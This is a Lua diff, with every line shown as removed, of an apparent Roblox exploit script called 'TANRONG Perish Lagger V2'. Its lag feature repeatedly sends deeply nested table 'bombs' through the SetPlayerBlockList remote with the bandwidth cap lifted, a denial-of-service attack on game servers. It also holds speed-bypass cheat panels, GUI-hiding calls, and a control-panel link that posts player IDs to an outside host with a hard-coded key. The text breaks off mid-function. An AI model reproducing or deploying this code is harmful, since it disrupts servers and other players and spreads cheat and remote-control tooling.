-if data.Key and Enum.KeyCode[data.Key] then keybind = Enum.KeyCode[data.Key] end
-if type(data.Pos) == "table" then
-savedPos = data.Pos
-_G.AcePerishV2PanelPosition = data.Pos
-end
-if data.Scale then
-v2PanelScale = math.clamp(tonumber(data.Scale) or 70, 1, 100)
-_G.AcePerishV2PanelScale = v2PanelScale
-end
-if data.Locked == true or data.Bloqueado == true then
-_G.AcePerishV2Locked = true
-end
-if data.PanelOpen == true then
-_G.AcePerishV2PanelOpen = true
-end
-end)
-	end
-	LoadConfig()
-
-	local cachedBomb, cachedPower = nil, nil
-	local function buildBomb(poder)
-local mainT, spam = {}, {{}}
-local z = spam[1]
-for i = 1, 25 do local t = {}; table.insert(z, t); z = t end
-local max = math.min(12000, (tonumber(poder) or 23) * 50)
-for i = 1, max do table.insert(mainT, spam) end
-return mainT
-	end
-	local function fireBomb()
-if not cachedBomb or cachedPower ~= NIVELES[nivelActual].poder then
-cachedPower = NIVELES[nivelActual].poder
-cachedBomb = buildBomb(cachedPower)
-end
-pcall(function()
-game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBomb)
-end)
-	end
-
-	pcall(function()
-for _, parent in ipairs({ CoreGui, PlayerGui }) do
-local old = parent:FindFirstChild("Per1shccLaggerV2")
-if old then old:Destroy() end
-end
-	end)
-
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "Per1shccLaggerV2"
-	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	screenGui.ResetOnSpawn = false
-	screenGui.IgnoreGuiInset = true
-	screenGui.DisplayOrder = 60
-	pcall(function() if syn and syn.protect_gui then syn.protect_gui(screenGui) end end)
-	local okP = pcall(function() screenGui.Parent = CoreGui end)
-	if not okP then screenGui.Parent = PlayerGui end
-
-	local W, H = 286, 178
-
-	mainFrame = Instance.new("Frame", screenGui)
-	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(0, W, 0, H)
-	if savedPos then
-mainFrame.Position = UDim2.new(
-tonumber(savedPos.xs) or 0.14, tonumber(savedPos.xo) or 0,
-tonumber(savedPos.ys) or 0.5, tonumber(savedPos.yo) or -H / 2
-)
-	else
-mainFrame.Position = UDim2.new(0.14, 0, 0.5, -H / 2)
-	end
-	mainFrame.BackgroundColor3 = C.BG
-	mainFrame.BackgroundTransparency = 0.08
-	mainFrame.BorderSizePixel = 0
-	mainFrame.ClipsDescendants = true
-	mainFrame.Active = true
-	mainFrame.Visible = false -- mở từ menu như V1
-
-	-- Scale V2 panel (dùng v2PanelScale đã LoadConfig)
-	v2PanelScale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100)
-	local uiScale = Instance.new("UIScale")
-	uiScale.Name = "V2PanelScale"
-	uiScale.Scale = v2PanelScale / 100
-	uiScale.Parent = mainFrame
-	_G.AcePerishV2PanelScale = v2PanelScale
-	_G.AceSetPerishV2PanelScale = function(v)
-v = math.clamp(tonumber(v) or 70, 1, 100)
-v2PanelScale = v
-_G.AcePerishV2PanelScale = v
-uiScale.Scale = v / 100
-pcall(SaveConfig)
-	end
-
-	corner(mainFrame, 16)
-
-	-- BACKGROUND IMAGE + TINT (full)
-	local bgImg = Instance.new("ImageLabel", mainFrame)
-	bgImg.Size = UDim2.new(1, 0, 1, 0)
-	bgImg.BackgroundTransparency = 1
-	bgImg.Image = "rbxassetid://77503307528071"
-	pcall(function()
-		local a = getTanrongLogoAsset and getTanrongLogoAsset()
-		if a and a ~= "" then bgImg.Image = a end
-	end)
-	bgImg.ScaleType = Enum.ScaleType.Crop
-	bgImg.ImageTransparency = 0.35
-	bgImg.ZIndex = 0
-	corner(bgImg, 16)
-
-	local bgTint = Instance.new("Frame", mainFrame)
-	bgTint.Size = UDim2.new(1, 0, 1, 0)
-	bgTint.BackgroundColor3 = C.Dark
-	bgTint.BackgroundTransparency = 0.35
-	bgTint.BorderSizePixel = 0
-	bgTint.ZIndex = 0
-	corner(bgTint, 16)
-	local tintGrad = Instance.new("UIGradient", bgTint)
-	tintGrad.Rotation = 120
-	tintGrad.Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, C.RedDeep),
-ColorSequenceKeypoint.new(0.55, C.BG),
-ColorSequenceKeypoint.new(1, C.Red),
-	})
-	tintGrad.Transparency = NumberSequence.new({
-NumberSequenceKeypoint.new(0, 0.35),
-NumberSequenceKeypoint.new(0.5, 0.75),
-NumberSequenceKeypoint.new(1, 0.4),
-	})
-	task.spawn(function()
-while tintGrad and tintGrad.Parent do
-tintGrad.Rotation = (tintGrad.Rotation + 0.4) % 360
-task.wait(0.05)
-end
-	end)
-
-	shineStroke(mainFrame)
-
-	-- PARTICLES (full)
-	local particles = {}
-	for i = 1, 26 do
-local p = Instance.new("Frame", mainFrame)
-p.BorderSizePixel = 0
-p.BackgroundColor3 = (i % 3 == 0) and C.White or C.RedSoft
-local s = 1 + math.random() * 2
-p.Size = UDim2.new(0, s, 0, s)
-p.Position = UDim2.new(math.random(), 0, math.random(), 0)
-p.BackgroundTransparency = 0.25 + math.random() * 0.5
-p.ZIndex = 1
-corner(p, 99)
-table.insert(particles, {
-frame = p,
-base = p.BackgroundTransparency,
-timer = 1.5 + math.random() * 2.5,
-elapsed = 0,
-})
-	end
-	task.spawn(function()
-while mainFrame and mainFrame.Parent do
-if not mainFrame.Visible then
-task.wait(0.5)
-else
-for _, d in ipairs(particles) do
-local fr = d.frame
-if fr and fr.Parent then
-d.elapsed = d.elapsed + 0.1
-fr.Position = fr.Position + UDim2.new(0, 0, 0, -0.25)
-if fr.Position.Y.Scale < 0 then
-fr.Position = UDim2.new(math.random(), 0, 1, 0)
-end
-if d.elapsed >= d.timer then
-d.elapsed = 0
-d.timer = 1.5 + math.random() * 2.5
-TweenService:Create(fr, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
-task.delay(0.2, function()
-if not d.frame or not d.frame.Parent then return end
-d.frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
-local ns = 1 + math.random() * 2
-d.frame.Size = UDim2.new(0, ns, 0, ns)
-TweenService:Create(d.frame, TweenInfo.new(0.5), { BackgroundTransparency = d.base }):Play()
-end)
-end
-end
-end
-task.wait(0.1)
-end -- else/if
-end -- while
-	end) -- particle task.spawn
-
-	-- HEADER
-	local header = Instance.new("Frame", mainFrame)
-	header.Size = UDim2.new(1, 0, 0, 48)
-	header.BackgroundTransparency = 1
-	header.ZIndex = 3
-
-	local av = Instance.new("ImageLabel", header)
-	av.Size = UDim2.new(0, 30, 0, 30)
-	av.Position = UDim2.new(0, 12, 0, 9)
-	av.BackgroundColor3 = C.RedDeep
-	av.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LP.UserId .. "&w=150&h=150"
-	av.ScaleType = Enum.ScaleType.Crop
-	av.ZIndex = 3
-	corner(av, 9)
-	stroke(av, C.Red, 1, 0.4)
-
-	local title = Instance.new("TextLabel", header)
-	title.BackgroundTransparency = 1
-	title.Position = UDim2.new(0, 50, 0, 8)
-	title.Size = UDim2.new(0, 150, 0, 19)
-	title.Font = Enum.Font.GothamBlack
-	title.Text = "TANRONG"
-	title.TextColor3 = C.White
-	title.TextSize = 18
-	title.TextXAlignment = Enum.TextXAlignment.Left
-	title.ZIndex = 3
-	highlight(title, C.Red)
-
-	local subtitle = Instance.new("TextLabel", header)
-	subtitle.BackgroundTransparency = 1
-	subtitle.Position = UDim2.new(0, 50, 0, 26)
-	subtitle.Size = UDim2.new(0, 170, 0, 12)
-	subtitle.Font = Enum.Font.GothamBold
-	subtitle.Text = "TANRONG"
-	subtitle.TextColor3 = C.TextDim
-	subtitle.TextSize = 10
-	subtitle.TextXAlignment = Enum.TextXAlignment.Left
-	subtitle.ZIndex = 3
-
-	-- LOCK / UNLOCK (bên phải, giống Ping Lagger)
-	local v2Locked = false
-	local lockBtn = Instance.new("TextButton", header)
-	lockBtn.Name = "LockBtn"
-	lockBtn.Size = UDim2.new(0, 52, 0, 22)
-	lockBtn.Position = UDim2.new(1, -64, 0.5, -11)
-	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
-	lockBtn.BorderSizePixel = 0
-	lockBtn.Text = "LOCK"
-	lockBtn.TextColor3 = C.TextDim
-	lockBtn.Font = Enum.Font.GothamBold
-	lockBtn.TextSize = 9
-	lockBtn.AutoButtonColor = false
-	lockBtn.ZIndex = 10
-	corner(lockBtn, 6)
-	stroke(lockBtn, C.Red, 1, 0.55)
-	local function setV2Locked(on)
-v2Locked = on and true or false
-lockBtn.Text = v2Locked and "UNLOCK" or "LOCK"
-lockBtn.BackgroundColor3 = v2Locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(25, 25, 28)
-lockBtn.TextColor3 = v2Locked and C.White or C.TextDim
-	end
-	lockBtn.MouseButton1Click:Connect(function()
-setV2Locked(not v2Locked)
-_G.AcePerishV2Locked = v2Locked
-pcall(SaveConfig)
-	end)
-	_G.AceIsPerishV2Locked = function()
-return v2Locked == true
-	end
-	_G.AceSetPerishV2Locked = function(on)
-setV2Locked(on)
-_G.AcePerishV2Locked = v2Locked
-pcall(SaveConfig)
-	end
-
-	local sep = Instance.new("Frame", mainFrame)
-	sep.Size = UDim2.new(1, -28, 0, 1)
-	sep.Position = UDim2.new(0, 14, 0, 48)
-	sep.BorderSizePixel = 0
-	sep.BackgroundColor3 = C.Red
-	sep.ZIndex = 3
-	local sepG = Instance.new("UIGradient", sep)
-	sepG.Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, C.Red),
-ColorSequenceKeypoint.new(0.5, C.White),
-ColorSequenceKeypoint.new(1, C.Red),
-	})
-	sepG.Transparency = NumberSequence.new({
-NumberSequenceKeypoint.new(0, 1),
-NumberSequenceKeypoint.new(0.5, 0.05),
-NumberSequenceKeypoint.new(1, 1),
-	})
-	task.spawn(function()
-while sepG and sepG.Parent do
-if mainFrame and not mainFrame.Visible then
-task.wait(0.5)
-else
-sepG.Offset = Vector2.new((tick() * 0.4) % 2 - 1, 0)
-task.wait(0.05)
-end
-end
-	end)
-
-	-- ROW LAGGER + TOGGLE
-	local row = Instance.new("Frame", mainFrame)
-	row.Position = UDim2.new(0, 12, 0, 58)
-	row.Size = UDim2.new(1, -24, 0, 34)
-	row.BackgroundColor3 = C.Row
-	row.BackgroundTransparency = 0.25
-	row.BorderSizePixel = 0
-	row.ZIndex = 2
-	corner(row, 10)
-	stroke(row, C.Red, 1, 0.6)
-
-	local textLagger = Instance.new("TextLabel", row)
-	textLagger.BackgroundTransparency = 1
-	textLagger.Position = UDim2.new(0, 12, 0, 0)
-	textLagger.Size = UDim2.new(0, 110, 1, 0)
-	textLagger.Font = Enum.Font.GothamBlack
-	textLagger.Text = "LAGGER"
-	textLagger.TextColor3 = C.Text
-	textLagger.TextSize = 13
-	textLagger.TextXAlignment = Enum.TextXAlignment.Left
-	textLagger.ZIndex = 3
-
-	local powerLabel = Instance.new("TextLabel", row)
-	powerLabel.BackgroundTransparency = 1
-	powerLabel.Position = UDim2.new(0, 12, 0, 0)
-	powerLabel.Size = UDim2.new(1, -100, 1, 0)
-	powerLabel.Font = Enum.Font.GothamBold
-	powerLabel.Text = "POWER 23"
-	powerLabel.TextColor3 = C.TextDim
-	powerLabel.TextSize = 9
-	powerLabel.TextXAlignment = Enum.TextXAlignment.Right
-	powerLabel.ZIndex = 3
-
-	local toggleContainer = Instance.new("Frame", row)
-	toggleContainer.BackgroundColor3 = C.Off
-	toggleContainer.Position = UDim2.new(1, -78, 0.5, -11)
-	toggleContainer.Size = UDim2.new(0, 68, 0, 22)
-	toggleContainer.BorderSizePixel = 0
-	toggleContainer.ZIndex = 3
-	corner(toggleContainer, 99)
-	stroke(toggleContainer, C.Red, 1, 0.5)
-
-	local toggleBall = Instance.new("Frame", toggleContainer)
-	toggleBall.BackgroundColor3 = C.RedSoft
-	toggleBall.Size = UDim2.new(0, 18, 0, 18)
-	toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
-	toggleBall.BorderSizePixel = 0
-	toggleBall.ZIndex = 4
-	corner(toggleBall, 99)
-
-	local toggleClick = Instance.new("TextButton", toggleContainer)
-	toggleClick.BackgroundTransparency = 1
-	toggleClick.Size = UDim2.new(1, 0, 1, 0)
-	toggleClick.ZIndex = 5
-	toggleClick.Font = Enum.Font.GothamBlack
-	toggleClick.Text = "OFF"
-	toggleClick.TextSize = 9
-	toggleClick.TextColor3 = C.Red
-	toggleClick.AutoButtonColor = false
-
-	-- LEVEL BAR
-	local levelBar = Instance.new("Frame", mainFrame)
-	levelBar.Position = UDim2.new(0, 12, 0, 98)
-	levelBar.Size = UDim2.new(1, -24, 0, 30)
-	levelBar.BackgroundColor3 = C.Row
-	levelBar.BackgroundTransparency = 0.3
-	levelBar.BorderSizePixel = 0
-	levelBar.ZIndex = 2
-	corner(levelBar, 10)
-	stroke(levelBar, C.Red, 1, 0.6)
-
-	local pad = Instance.new("UIPadding", levelBar)
-	pad.PaddingLeft = UDim.new(0, 4)
-	pad.PaddingRight = UDim.new(0, 4)
-	pad.PaddingTop = UDim.new(0, 4)
-	pad.PaddingBottom = UDim.new(0, 4)
-	local grid = Instance.new("UIListLayout", levelBar)
-	grid.FillDirection = Enum.FillDirection.Horizontal
-	grid.Padding = UDim.new(0, 4)
-	grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
-	local btns, strokes = {}, {}
-	for _, name in ipairs(ORDER) do
-local b = Instance.new("TextButton", levelBar)
-b.Size = UDim2.new(0.25, -4, 1, 0)
-b.BackgroundColor3 = C.Card
-b.BackgroundTransparency = 0.15
-b.Font = Enum.Font.GothamBlack
-b.Text = name:upper()
-b.TextSize = 10
-b.TextColor3 = C.TextDim
-b.AutoButtonColor = false
-b.BorderSizePixel = 0
-b.ZIndex = 3
-corner(b, 8)
-hoverLift(b)
-btns[name] = b
-strokes[name] = stroke(b, C.Red, 1, 0.6)
-	end
-
-	-- FOOTER: chỉ KEY (không ms)
-	local footer = Instance.new("Frame", mainFrame)
-	footer.Position = UDim2.new(0, 12, 1, -42)
-	footer.Size = UDim2.new(1, -24, 0, 30)
-	footer.BackgroundColor3 = C.Row
-	footer.BackgroundTransparency = 0.3
-	footer.BorderSizePixel = 0
-	footer.ZIndex = 2
-	corner(footer, 10)
-	stroke(footer, C.Red, 1, 0.6)
-
-	local keybindButton = Instance.new("TextButton", footer)
-	keybindButton.Position = UDim2.new(0, 6, 0.5, -10)
-	keybindButton.Size = UDim2.new(1, -12, 0, 20)
-	keybindButton.BackgroundColor3 = C.Card
-	keybindButton.BackgroundTransparency = 0.15
-	keybindButton.Font = Enum.Font.GothamBold
-	keybindButton.Text = "KEY: M"
-	keybindButton.TextColor3 = C.TextDim
-	keybindButton.TextSize = 11
-	keybindButton.AutoButtonColor = false
-	keybindButton.ZIndex = 3
-	corner(keybindButton, 7)
-	stroke(keybindButton, C.Red, 1, 0.55)
-	hoverLift(keybindButton)
-
-	local tryhardText = Instance.new("TextLabel", mainFrame)
-	tryhardText.BackgroundTransparency = 1
-	tryhardText.Position = UDim2.new(0, 14, 0, 131)
-	tryhardText.Size = UDim2.new(1, -28, 0, 12)
-	tryhardText.Font = Enum.Font.GothamBold
-	tryhardText.Text = "only for tryhards"
-	tryhardText.TextColor3 = C.RedSoft
-	tryhardText.TextSize = 9
-	tryhardText.TextXAlignment = Enum.TextXAlignment.Center
-	tryhardText.ZIndex = 3
-	tryhardText.Visible = false
-
-	local levelColors = { Low = C.Green, Mid = C.Yellow, High = C.Red, Ultra = C.White }
-
-	local function actualizarBotonesNivel()
-for _, name in ipairs(ORDER) do
-local b, s = btns[name], strokes[name]
-if name == nivelActual then
-TweenService:Create(b, TweenInfo.new(0.18), {
-BackgroundColor3 = levelColors[name],
-BackgroundTransparency = 0.05,
-}):Play()
-b.TextColor3 = (name == "Ultra") and C.Dark or C.Text
-s.Color = levelColors[name]
-s.Transparency = 0.1
-else
-TweenService:Create(b, TweenInfo.new(0.18), {
-BackgroundColor3 = C.Card,
-BackgroundTransparency = 0.15,
-}):Play()
-b.TextColor3 = C.TextDim
-s.Color = C.Red
-s.Transparency = 0.6
-end
-end
-tryhardText.Visible = (nivelActual == "Ultra")
-powerLabel.Text = "POWER " .. NIVELES[nivelActual].poder
-cachedBomb = nil
-	end
-
-	local function actualizarKeybindButton()
-keybindButton.Text = "KEY: " .. tostring(keybind.Name):gsub("Button", "")
-	end
-
-	local function setLaggerOn(on)
-on = on and true or false
-laggerActive = on
-if laggerActive then
-pcall(function()
-if setTanrongLaggerEnabled then setTanrongLaggerEnabled(false) end
-if _G.AceSetTanrongLaggerEnabled then _G.AceSetTanrongLaggerEnabled(false) end
-end)
-end
-TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-Position = laggerActive and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
-BackgroundColor3 = laggerActive and C.White or C.RedSoft,
-}):Play()
-TweenService:Create(toggleContainer, TweenInfo.new(0.2), {
-BackgroundColor3 = laggerActive and C.RedDeep or C.Off,
-}):Play()
-toggleClick.Text = laggerActive and "ON" or "OFF"
-toggleClick.TextColor3 = laggerActive and C.Green or C.Red
-
-if laggerActive then
-if lagThread then pcall(task.cancel, lagThread) end
-lagThread = task.spawn(function()
-pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
-while laggerActive do
-fireBomb()
-task.wait(0.18)
-end
-pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
-end)
-else
-if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
-pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
-end
-	end
-
-	local function toggleLagger()
-setLaggerOn(not laggerActive)
-	end
-
-	_G.AceSetPerishV2Lagger = setLaggerOn
-	_G.AceTogglePerishV2Lagger = toggleLagger
-	_G.AcePerishV2LaggerActive = function() return laggerActive end
-
-	toggleClick.MouseButton1Click:Connect(toggleLagger)
-	for _, name in ipairs(ORDER) do
-btns[name].MouseButton1Click:Connect(function()
-nivelActual = name
-actualizarBotonesNivel()
-SaveConfig()
-end)
-	end
-	keybindButton.MouseButton1Click:Connect(function()
-if listeningForInput then return end
-listeningForInput = true
-keybindButton.Text = "PRESS..."
-keybindButton.BackgroundColor3 = C.Red
-keybindButton.TextColor3 = C.Text
-	end)
-
-	actualizarKeybindButton()
-actualizarBotonesNivel()
-
-	UserInputService.InputBegan:Connect(function(input, gp)
-if gp then return end
-if listeningForInput then
-if input.KeyCode ~= Enum.KeyCode.Unknown then
-keybind = input.KeyCode
-listeningForInput = false
-actualizarKeybindButton()
-keybindButton.BackgroundColor3 = C.Card
-keybindButton.TextColor3 = C.TextDim
-SaveConfig()
-end
-return
-end
-if input.KeyCode == keybind then
-toggleLagger()
-end
-	end)
-
-	-- DRAG + save pos (khóa khi LOCK)
-	local isDragging, dragStart, startPos = false, nil, nil
-	_G.AceCancelTanrongLaggerDrag = function(force)
-isDragging = false
-if force then
-setV2Locked(true)
-end
-	end
-	header.InputBegan:Connect(function(input)
-if v2Locked then return end
-if input.UserInputType == Enum.UserInputType.MouseButton1
-or input.UserInputType == Enum.UserInputType.Touch then
--- không bắt đầu drag khi bấm nút LOCK
-local pos = input.Position
-local abs = lockBtn.AbsolutePosition
-local asz = lockBtn.AbsoluteSize
-if pos.X >= abs.X and pos.X <= abs.X + asz.X and pos.Y >= abs.Y and pos.Y <= abs.Y + asz.Y then
-return
-end
-isDragging = true
-dragStart = input.Position
-startPos = mainFrame.Position
-end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-if v2Locked or not isDragging then return end
-if input.UserInputType == Enum.UserInputType.MouseMovement
-or input.UserInputType == Enum.UserInputType.Touch then
-local delta = input.Position - dragStart
-mainFrame.Position = UDim2.new(
-startPos.X.Scale, startPos.X.Offset + delta.X,
-startPos.Y.Scale, startPos.Y.Offset + delta.Y
-)
-end
-	end)
-	UserInputService.InputEnded:Connect(function(input)
-if input.UserInputType == Enum.UserInputType.MouseButton1
-or input.UserInputType == Enum.UserInputType.Touch then
-if isDragging then
-isDragging = false
-if mainFrame then
-local p = mainFrame.Position
-local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-_G.AcePerishV2PanelPosition = pos
-savedPos = pos
-end
-pcall(SaveConfig)
-end
-end
-	end)
-
-	-- No auto-open: size full sẵn, Visible = false đến khi mở từ menu
-	mainFrame.Size = UDim2.new(0, W, 0, H)
-
-	
-	-- Lưu vị trí panel (giống V1)
-	local function saveV2PanelPos()
-if mainFrame and mainFrame.Parent then
-local p = mainFrame.Position
-local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-_G.AcePerishV2PanelPosition = pos
-savedPos = pos
-return pos
-end
-return _G.AcePerishV2PanelPosition or savedPos
-	end
-
-	local function restoreV2PanelPos()
-local sp = _G.AcePerishV2PanelPosition or savedPos
-if type(sp) == "table" and mainFrame then
-mainFrame.Position = UDim2.new(
-tonumber(sp.xs) or 0.14, tonumber(sp.xo) or 0,
-tonumber(sp.ys) or 0.5, tonumber(sp.yo) or -H / 2
-)
-return true
-end
-return false
-	end
-
-	-- Đóng/mở panel: LUÔN giữ vị trí + trạng thái LOCK (không reset)
-	local function setV2PanelVisible(on, skipSave)
-on = on and true or false
-if not on then
--- Lưu vị trí hiện tại trước khi ẩn (kể cả đang LOCK)
-saveV2PanelPos()
-_G.AcePerishV2Locked = v2Locked == true
-if not skipSave then
-pcall(SaveConfig)
-end
-if mainFrame then mainFrame.Visible = false end
-_G.AcePerishV2PanelOpen = false
--- KHÔNG OFF lagger, KHÔNG đổi lock
-return
-end
--- Open lại: restore đúng vị trí đã lưu
-restoreV2PanelPos()
-if mainFrame then
-mainFrame.Size = UDim2.new(0, W, 0, H)
-mainFrame.Visible = true
-end
--- restore lock state
-if _G.AcePerishV2Locked == true then
-setV2Locked(true)
-end
-_G.AcePerishV2PanelOpen = true
-if not skipSave then
-pcall(SaveConfig)
-end
-	end
-	_G.AceSetPerishV2PanelVisible = setV2PanelVisible
-	_G.AceTogglePerishV2Panel = function()
-setV2PanelVisible(not (mainFrame and mainFrame.Visible))
-	end
-	_G.AceSavePerishV2PanelPos = saveV2PanelPos
-
-	-- Trạng thái ban đầu: ẩn panel, giữ pos đã load
-	mainFrame.Visible = false
-	_G.AcePerishV2PanelOpen = false
-	restoreV2PanelPos()
-	if _G.AcePerishV2Locked == true then
-setV2Locked(true)
-	end
-
-print("[Tanrong] Perish Lagger V2 FULL GUI loaded (menu toggle, pos persist like V1)")
-
-end)
-
--- ============================================================
--- WRAPPERS: Settings → TANRONG Lagger V2 (Perish) + Speed Bypass
--- ============================================================
-do
-	function _G.TANRONGSetLaggerPanel(on)
-on = on and true or false
-if type(St) == "table" then St.showLaggerPanel = on end
-pcall(function()
-if _G.AceSetPerishV2PanelVisible then
-_G.AceSetPerishV2PanelVisible(on)
-else
-_G.AcePerishV2PanelOpen = on
-end
-end)
-pcall(function() if saveCfg then saveCfg() end end)
-	end
-
-	function _G.TANRONGSetLaggerLock(on)
-on = on and true or false
-if type(St) == "table" then St.laggerPanelLock = on end
-pcall(function() if _G.AceSetPerishV2Lock then _G.AceSetPerishV2Lock(on) end end)
-pcall(function() if saveCfg then saveCfg() end end)
-	end
-
-	function _G.TANRONGSetSpeedBypassPanel(on)
-on = on and true or false
-if type(St) == "table" then
-St.showSpeedBypassPanel = on
-end
-local function forceGui(on2)
-pcall(function()
-local parents = {}
-pcall(function() table.insert(parents, gethui and gethui()) end)
-table.insert(parents, game:GetService("CoreGui"))
-local lp = game:GetService("Players").LocalPlayer
-if lp then table.insert(parents, lp:FindFirstChild("PlayerGui")) end
-local gui = nil
-for _, p in ipairs(parents) do
-if p then
-gui = p:FindFirstChild("TANRONGBypassGui")
-if gui then break end
-end
-end
-if not gui then return end
-gui.Enabled = true
-gui.DisplayOrder = 250
-local main = gui:FindFirstChild("MainFrame")
-local mini = gui:FindFirstChild("Mini") or gui:FindFirstChild("MiniFrame")
-if on2 then
-if main then main.Visible = true end
-if mini then mini.Visible = false end
-_G.AceTanrongBypassPanelOpen = true
-else
--- save pos before hide
-if main and main.Visible then
-_G.AceTanrongBypassPanelPosition = {
-xs = main.Position.X.Scale, xo = main.Position.X.Offset,
-ys = main.Position.Y.Scale, yo = main.Position.Y.Offset,
-}
-if type(St) == "table" then
-St._sbPanelPos = {
-main.Position.X.Scale, main.Position.X.Offset,
-main.Position.Y.Scale, main.Position.Y.Offset,
-}
-end
-end
-if main then main.Visible = false end
-if mini then mini.Visible = false end
-_G.AceTanrongBypassPanelOpen = false
-end
-end)
-end
-local api = _G.AceSetTanrongBypassPanelVisible
-if type(api) == "function" then
-local ok, err = pcall(api, on)
-if not ok then warn("[TANRONG] SpeedBypass panel:", err) end
-else
--- API chưa sẵn: đợi tối đa 1s (không 5s)
-task.spawn(function()
-for _ = 1, 10 do
-if type(_G.AceSetTanrongBypassPanelVisible) == "function" then
-pcall(_G.AceSetTanrongBypassPanelVisible, on)
-break
-end
-task.wait(0.1)
-end
-forceGui(on)
-end)
-end
-forceGui(on)
-pcall(function() if saveCfg then saveCfg() end end)
-	end
-
-function _G.TANRONGSetSpeedBypassLock(on)
-on = on and true or false
-if type(St) == "table" then St.speedBypassLock = on end
--- Lock riêng Speed Bypass — không dính Lock UI menu chính (St.guiLock)
-pcall(function()
-if _G.AceSetTanrongBypassLock then
-_G.AceSetTanrongBypassLock(on)
-else
-_G.AceTanrongBypassLocked = on
-end
-end)
-pcall(function() if saveCfg then saveCfg() end end)
-	end
-
-	task.defer(function()
-task.wait(0.2)
-pcall(function()
-if type(St) == "table" and St.showLaggerPanel then _G.TANRONGSetLaggerPanel(true) end
--- Speed Bypass: chỉ hiện nếu user đã ON show trong settings (không auto)
-if type(St) == "table" and St.showSpeedBypassPanel == true then
-_G.TANRONGSetSpeedBypassPanel(true)
-elseif type(_G.TANRONGSetSpeedBypassPanel) == "function" then
-_G.TANRONGSetSpeedBypassPanel(false)
-end
-end)
-	end)
-end
-
-print("[TANRONG] FULL Tanrong Lagger V2 (Perish) + Speed Bypass GUI (no old Vynx)")
-end)
-
-
-
-
--- ============================================================
--- === CONTROL PANEL CONNECTION (auto) ===
-do
-local BASE = "https://tanronghubblagger.lovable.app"
-local KEY = "Grin@1234"
-local SCRIPT = "FreeAllGear"
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local plr = Players.LocalPlayer
-local lagLevel = 0
-local freezeUntil = 0
-local freezeBusy = 0.9
-local activeGuis = {}
-local cpSound = nil
-
--- Xoá hết thông báo đang hiện
-function clearNotify()
-for gui in pairs(activeGuis) do
-pcall(function() gui:Destroy() end)
-activeGuis[gui] = nil
-end
-end
-
--- Phát / đổi âm lượng / OFF nhạc bằng ID Roblox
-function playMusic(id, volume, looped)
-volume = math.clamp((tonumber(volume) or 50) / 100, 0, 1)
-pcall(function()
-if not id or tostring(id) == "0" or tostring(id) == "" then
-if cpSound then cpSound:Destroy() cpSound = nil end
-return
-end
-local url = "rbxassetid://" .. tostring(id)
-if cpSound and cpSound.SoundId == url then
-cpSound.Volume = volume
-if not cpSound.IsPlaying then cpSound:Play() end
-return
-end
-if cpSound then cpSound:Destroy() end
-cpSound = Instance.new("Sound")
-cpSound.Name = "CP_Music"
-cpSound.SoundId = url
-cpSound.Volume = volume
-cpSound.Looped = looped ~= false
-cpSound.Parent = (gethui and gethui()) or game:GetService("SoundService")
-cpSound:Play()
-end)
-end
-
--- Thông báo chữ BỰ giữa màn hình
-function bigNotify(text, size, duration, color)
-if not text or text == "" then return end
-size = tonumber(size) or 48
-duration = tonumber(duration) or 5
-pcall(function()
-local parent = (gethui and gethui()) or game:GetService("CoreGui")
-local gui = Instance.new("ScreenGui")
-gui.Name = "CP_BigNotify"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.DisplayOrder = 999999
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = parent
-activeGuis[gui] = true
-
-local shade = Instance.new("Frame")
-shade.BackgroundColor3 = Color3.new(0, 0, 0)
-shade.BackgroundTransparency = 0.55
-shade.Size = UDim2.fromScale(1, 1)
-shade.BorderSizePixel = 0
-shade.Parent = gui
-
-local label = Instance.new("TextLabel")
-label.BackgroundTransparency = 1
-label.Size = UDim2.fromScale(0.92, 0.5)
-label.Position = UDim2.fromScale(0.04, 0.25)
-label.Font = Enum.Font.GothamBlack
-label.TextScaled = false
-label.TextSize = size
-label.TextWrapped = true
-label.RichText = true
-label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
-label.TextStrokeTransparency = 0
-label.TextStrokeColor3 = Color3.new(0, 0, 0)
-label.Text = text
-label.TextTransparency = 1
-label.Parent = gui
-
-TweenService:Create(label, TweenInfo.new(0.25), { TextTransparency = 0 }):Play()
-task.delay(duration, function()
-pcall(function()
-TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
-TweenService:Create(shade, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
-end)
-task.wait(0.4)
-activeGuis[gui] = nil
-pcall(function() gui:Destroy() end)
-end)
-end)
-end
-
-function post(path, body)
-return HttpService:RequestAsync({
-Url = BASE .. path,
-Method = "POST",
-Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = KEY },
-Body = HttpService:JSONEncode(body),
-})
-end
-function heartbeat()
-local ok, res = pcall(post, "/api/public/lua/heartbeat", {
-user_id = tostring(plr.UserId),
